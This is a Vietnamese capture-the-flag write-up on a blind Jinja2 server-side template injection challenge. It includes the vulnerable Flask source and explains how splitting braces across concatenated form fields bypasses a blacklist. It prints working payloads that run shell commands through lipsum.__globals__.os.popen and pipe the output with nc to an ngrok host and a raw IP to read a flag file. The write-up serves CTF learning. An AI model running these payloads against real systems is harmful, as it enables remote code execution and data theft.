# Python - Blind SSTI Filters Bypass (Hard - 75 pts)

Bài này cung cấp source code, nên chúng ta sẽ thực tải tải source code về để phân tích:

server_ch73.py

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Podalirius

import jinja2
from flask import Flask, flash, redirect, render_template, request, session, abort

mail = """
Hello team,

A new hacker wants to join our private Bug bounty program! Mary, can you schedule an interview?

 - Name: {{ hacker_name }}
 - Surname: {{ hacker_surname }}
 - Email: {{ hacker_email }}
 - Birth date: {{ hacker_bday }}

I'm sending you the details of the application in the attached CSV file:

 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'

Best regards,
"""

def sendmail(address, content):
    try:
        content += "\n\n{{ signature }}"
        _signature = """---\n<b>Offsec Team</b>\noffsecteam@hackorp.com"""
        content = jinja2.Template(content).render(signature=_signature)
        print(content)
    except Exception as e:
        pass
    return None

def sanitize(value):
    blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']
    #blacklist =[]
    for word in blacklist:
        if word in value:
            value = value.replace(word,'')
    if any([bool(w in value) for w in blacklist]):
        value = sanitize(value)
    return value

app = Flask(__name__, template_folder="./templates/", static_folder="./static/")
app.config['DEBUG'] = False

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")

@app.route("/", methods=['GET','POST'])
def register():
    global mail
    if request.method == "POST":
        #if "name" in request.form.keys() and len(request.form["name"]) != 0 and "surname" in request.form.keys() and len(request.form["surname"]) != 0 and "email" in request.form.keys() and len(request.form["email"]) != 0 and "bday" in request.form.keys() and len(request.form["bday"]) != 0 :
        if True:
            '''if len(request.form["name"]) > 20:
                return render_template("index.html", error="Field 'name' is too long.")
            if len(request.form["surname"]) >= 50:
                return render_template("index.html", error="Field 'surname' is too long.")
            if len(request.form["email"]) >= 50:
                return render_template("index.html", error="Field 'email' is too long.")
            if len(request.form["bday"]) > 10:
                return render_template("index.html", error="Field 'bday' is too long.")'''
            try:
                register_mail = jinja2.Template(mail).render(
                    hacker_name=sanitize(request.form["name"]),
                    hacker_surname=sanitize(request.form["surname"]),
                    hacker_email=sanitize(request.form["email"]),
                    hacker_bday=sanitize(request.form["bday"])
                )
            except Exception as e:
                pass
            sendmail("offsecteam@hackorp.com", register_mail)
            return render_template("index.html", success='OK')
        else:
            return render_template("index.html", error="Missing fields in the application form!")
    elif request.method == 'GET':
        return render_template("index.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=59073)

```
Giải thích ngắn gọn thì bài này sẽ gồm một form gồm có 4 field input để nhập name, surname, email và birthday. Có một số điểm cần lưu ý trong đoạn code:

- Độ dài tối đa của name là 20, surname là 50, email là 50 và birthday là 10.
- Hàm sanitize sẽ thực hiện xóa kí tự nằm trong blacklist ra khỏi các chuỗi nhập vào.

Trong bài này templete được sử dụng là jinja2, nhưng tất cả `{{, }}, {%, %}` đều nằm trong blacklist, đâu là chỗ làm cho mình bế tak part 1.

Sau khi search mệt nhoài trên Internet và không tìm được solution nào hữu dụng cho trường hợp  này, mình đã quay trở lại nhìn đi nhìn lại đoạn code thật kĩ. Và mình phát hiện ra một điểm có vẻ sẽ hữu ích:

![image](https://user-images.githubusercontent.com/83667873/151422760-5fdfba84-541e-4c1e-9b52-edad35bcbb11.png)

Trong phần nội dung của mail sẽ được sử dụng trong phần sendmail có một tạo thành filename của file `.csv` mà ở đây nội dung do chúng ta nhập vào (name, surname, email, birthday) sẽ được viết liền nhau. 

Mình có thể lợi dụng điều này để tạo ra các cặp {{, }}, {%, %} tùy ý.

Nói suông khó hiểu, nên mình sẽ dựng lại ở local để test cho dễ:

Thêm print vô đây để xem được kết quả:

![image](https://user-images.githubusercontent.com/83667873/151424463-0dfbb6eb-abca-475d-9d6e-598c7a8ab208.png)

Ở đây mình sẽ nhập vào:

- name={
- surname={9*9}
- email=}
- birthday=hi

![image](https://user-images.githubusercontent.com/83667873/151424131-5e2c090b-17f2-4c19-9852-1b752b57e336.png)

Giờ chúng ta sẽ thấy kết quả chỗ .csv sẽ trở thành `81hi.csv`, chứng tỏ chúng ta đẽ thực hiện khai thác ssti được.

Vì bài này số kí tự bị giới hạn và một số từ bị filter như: `builtins, class, import,...`, nên mình thực hiện chọn ra một payload mà mình thấy thích hợp nhất:

```
{{lipsum.__globals__.os.popen('command')}}
```

Oke vấn đề thứ nhất được giải quyết, vấn đề thứ hai là kết quả sẽ không được show ra ở bất kì đâu, điều này làm mình betak part 2.

Đầu tiên mà mình nghĩ tới là sử dụng {% if %} {% endif%} block và hàm sleep để thực hiện lấy từng kí tự, nhưng hướng này nohope quá vì thật sự chúng ta chỉ có thể tận dụng nối input để tạo ra duy nhất một cặp {% %} hoặc {{ }}, và kí tự của name và email phải nhỏ hơn 50.

Tiếp theo mình nghĩ tới việc dựng reverse shell, nhưng trình gà quá nên mình dựng đi dựng lại nó vẫn không hoạt động được, vậy nên mình chuyển qua cách khác cũng tương tự nhưng tương đối thủ công hơn:

Ở máy local thực hiện lắng nghe trên port 12345

```
nc -lvp 12345
```
Sử dụng ngrok để public ra bên ngoài:

```
ngrok tcp 12345
```
![image](https://user-images.githubusercontent.com/83667873/151426237-78f88c6b-e972-4838-ac75-7ab7c4ace068.png)

Ở phía server, chúng ta cần tính toán để phân chia payload ở surname và email sao cho thích hợp, nó sẽ ở dạng tương tự:

```
name=hi{&surname={lipsum.__globals__.os.popen('command | nc 6.tcp.ngrok.io 13744').read()}&bday=hi}
```

`| nc 6.tcp.ngrok.io 13744` để gửi kết quả thực thi command từ server về máy local của chúng ta.

Trước tiên mình sẽ thử thực hiện list file:

```
name=hi{&surname={lipsum.__globals__.os.popen('ls | nc 6.tcp.ngrok.io 13744').read()}&bday=hi}
```

![image](https://user-images.githubusercontent.com/83667873/151427611-eae1b324-6c2b-4e65-aa84-e286f50f5938.png)

Ở đây có folder `9f` là đáng ngờ nhất nên mình thử list file trong 9f, sau một vài lần thử thì mình thấy có vẻ có rất nhiêu folder trong folder, chứng tỏ khả năng rất cao là flag nằm trong này.

Thử dùng find để tìm flag:

```
name=hi{&surname={lipsum.__globals__.os.popen("find -name 'flag*'&email=|nc 3.140.223.7 13744")}&bday=}
```

![image](https://user-images.githubusercontent.com/83667873/151428130-aa373dc3-f812-4d66-b065-24a5baac1013.png)

Oce, vậy là đã tìm được đường dẫn đến flag, oce vậy cat thôi. 

Hi, chưa cat được đâu, vì đường dẫn đến flag rất dài: `9f/35/cc/c7/95/80/59/46/ac/79/10/3d/aa/flag.txt` -> 47 kí tự, dù mình có tìm cách tối ưu như nào thì vẫn không thể đảm bảo nhỏ hơn 50 kí tự.

Ở đây mình có 2 cách giải quyết:

**Cách 1:**
Thực hiện sử dụng * thay vì nhập full đường dẫn, ví dụ:

`*/*/*/*/*/*/*/*/*/*/*/*/*/flag*` điều này giúp chúng ta tiết kiệm được kha khá kí tự:
 Payload:
 
 ```
 name=hi{&surname={lipsum.__globals__.os.popen("cat */*/*/*/*/*/*/*&email=/*/*/*/*/*/flag.t*|nc 3.140.223.7 13744").read()}&bday=}
 ```
*(3.140.223.7 là do mình chuyển từ 6.tcp.ngrok.io sang IP để rút ngắn ký tự :')))) )*

Kết quả đọc flag thành công:

![image](https://user-images.githubusercontent.com/83667873/151429208-2e3f8978-b33e-442b-997c-b41210e3377a.png)

**Cách 2:**

Mình tự nhận thấy cách này ngu ngok. Hehe. Anyway, it works

Dùng grep -r "something" để in ra nội dung, mình grep dần dần theo bản chữ cái đến khi nào gặp được flag. Cũng không lâu lắm, mình grep đến kí tự c là được:

![image](https://user-images.githubusercontent.com/83667873/151429959-4e56b554-cd01-4452-90b2-93c771becfbb.png)



